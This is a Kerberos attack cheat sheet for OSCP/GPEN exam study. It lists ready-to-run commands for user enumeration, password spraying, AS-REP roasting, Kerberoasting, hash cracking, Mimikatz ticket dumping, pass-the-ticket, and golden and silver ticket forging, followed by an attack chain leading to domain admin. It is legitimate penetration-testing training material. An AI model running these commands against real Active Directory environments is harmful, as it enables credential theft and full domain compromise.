# Kerberos Attack Cheat Sheet (OSCP / GPEN)

This cheat sheet provides a **structured reference for Kerberos enumeration and attacks** during **OSCP and GPEN exams**.

Kerberos is the authentication protocol used in **Active Directory environments**. Many AD attacks revolve around **abusing Kerberos tickets, misconfigurations, and credential reuse**.

Core methodology:

```
User Enumeration → Kerberos Attacks → Credential Cracking → Lateral Movement → Privilege Escalation
```

---

# 1. Kerberos Overview

Kerberos uses **tickets instead of passwords**.

Main components:

```
Client
Key Distribution Center (KDC)
Service
```

Ticket types:

```
TGT (Ticket Granting Ticket)
TGS (Ticket Granting Service Ticket)
```

Authentication flow:

```
User → TGT → TGS → Service Access
```

---

# 2. Kerberos Ports

Important ports:

```
88  Kerberos
464 Kerberos password change
```

Scan example:

```bash
nmap -p88 TARGET
```

---

# 3. Domain User Enumeration

Using Kerbrute:

```bash
kerbrute userenum users.txt -d domain.local
```

Example:

```bash
kerbrute userenum users.txt -d corp.local --dc 192.168.1.10
```

Output reveals **valid domain users**.

---

# 4. Password Spraying

Test common password across many users.

```bash
kerbrute passwordspray users.txt Password123 -d domain.local
```

Example:

```bash
kerbrute passwordspray users.txt Winter2024! -d corp.local
```

---

# 5. AS-REP Roasting

Targets users with **Kerberos pre-authentication disabled**.

Request AS-REP without password.

Tool:

```bash
GetNPUsers.py
```

Example:

```bash
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 192.168.1.10
```

Output example:

```
$krb5asrep$
```

Crack hash:

```bash
hashcat -m 18200 hash.txt rockyou.txt
```

---

# 6. Kerberoasting

Targets **service accounts with SPNs**.

Request service ticket and crack offline.

Tool:

```bash
GetUserSPNs.py
```

Example:

```bash
GetUserSPNs.py corp.local/user:Password123 -dc-ip 192.168.1.10
```

Output example:

```
$krb5tgs$
```

Crack hash:

```bash
hashcat -m 13100 hash.txt rockyou.txt
```

---

# 7. SPN Enumeration

List service accounts.

PowerShell:

```powershell
setspn -T domain.local -Q */*
```

Alternative:

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

---

# 8. Pass-the-Ticket

Reuse Kerberos tickets instead of passwords.

Inject ticket:

```powershell
Rubeus ptt ticket.kirbi
```

Or:

```powershell
mimikatz kerberos::ptt ticket.kirbi
```

---

# 9. Extract Kerberos Tickets

Dump tickets from memory.

Using Mimikatz:

```powershell
sekurlsa::tickets
```

Export tickets:

```powershell
kerberos::list /export
```

---

# 10. Ticket Cache Enumeration

Check tickets:

```bash
klist
```

Example output:

```
krbtgt/domain.local
```

---

# 11. Pass-the-Hash vs Pass-the-Ticket

| Attack | Credential Used |
|------|----------------|
| Pass-the-Hash | NTLM hash |
| Pass-the-Ticket | Kerberos ticket |

---

# 12. Golden Ticket Attack

Requires:

```
KRBTGT hash
Domain SID
Domain name
```

Generate golden ticket.

Example using Mimikatz:

```powershell
kerberos::golden /user:Administrator /domain:corp.local /sid:SID /krbtgt:HASH /ptt
```

Provides **permanent domain admin access**.

---

# 13. Silver Ticket Attack

Forge ticket for specific service.

Example:

```
CIFS
HTTP
LDAP
```

Example command:

```powershell
kerberos::golden /user:admin /service:cifs /target:server /rc4:HASH /sid:SID /ptt
```

---

# 14. Ticket Granting Ticket (TGT)

Request TGT:

```bash
getTGT.py domain/user:password
```

Example:

```bash
getTGT.py corp.local/user:Password123
```

Stores ticket in cache.

---

# 15. Service Ticket Request

Request TGS:

```bash
getST.py domain/user:password -spn service/host
```

Example:

```bash
getST.py corp.local/user:Password123 -spn cifs/server
```

---

# 16. Kerberos Delegation

Delegation types:

```
Unconstrained delegation
Constrained delegation
Resource-based delegation
```

Misconfigured delegation can lead to domain compromise.

---

# 17. Unconstrained Delegation Abuse

Attack path:

```
Compromise host with unconstrained delegation
Capture TGT
Reuse ticket
```

---

# 18. Constrained Delegation Abuse

Allows impersonation of users.

Example abuse:

```
S4U2Self
S4U2Proxy
```

Tool:

```
Rubeus
```

---

# 19. Resource-Based Constrained Delegation

Allows attackers to control delegation settings.

Used for:

```
privilege escalation
lateral movement
```

---

# 20. Kerberos Ticket Types

| Ticket | Purpose |
|------|---------|
| TGT | Authentication to KDC |
| TGS | Access service |

---

# 21. Kerberos Enumeration Tools

Common tools:

```
Kerbrute
Impacket
Rubeus
Mimikatz
BloodHound
```

---

# 22. Hashcat Kerberos Modes

| Mode | Attack |
|----|------|
| 13100 | Kerberoasting |
| 18200 | AS-REP roasting |

Example:

```bash
hashcat -m 13100 hash.txt rockyou.txt
```

---

# 23. Kerberos Attack Workflow

Typical attack chain:

```
1. Enumerate users
2. Perform password spraying
3. Perform AS-REP roasting
4. Perform Kerberoasting
5. Crack hashes
6. Move laterally
7. Dump credentials
8. Escalate privileges
```

---

# 24. Quick Kerberos Commands

User enumeration:

```bash
kerbrute userenum users.txt -d domain.local
```

Kerberoasting:

```bash
GetUserSPNs.py domain/user:password
```

AS-REP roasting:

```bash
GetNPUsers.py domain.local/ -usersfile users.txt
```

Ticket injection:

```powershell
Rubeus ptt ticket.kirbi
```

---

# 25. Common Kerberos Exam Attacks

Typical OSCP/GPEN scenarios:

```
Kerberoasting
AS-REP roasting
Password spraying
Pass-the-ticket
Golden ticket
Silver ticket
```

---

# 26. Troubleshooting Kerberos Attacks

Common issues:

```
Incorrect domain name
Incorrect DC IP
Time synchronization issues
Kerberos cache problems
```

Check time sync:

```bash
ntpdate DOMAIN_CONTROLLER
```

---

# 27. Final Advice

Kerberos attacks are **one of the most powerful techniques in Active Directory penetration testing**.

Always remember:

```
Service accounts often have weak passwords.
Kerberos tickets can be reused.
Credential reuse leads to domain compromise.
```

Effective Kerberos attacks often lead to **rapid domain administrator access**.
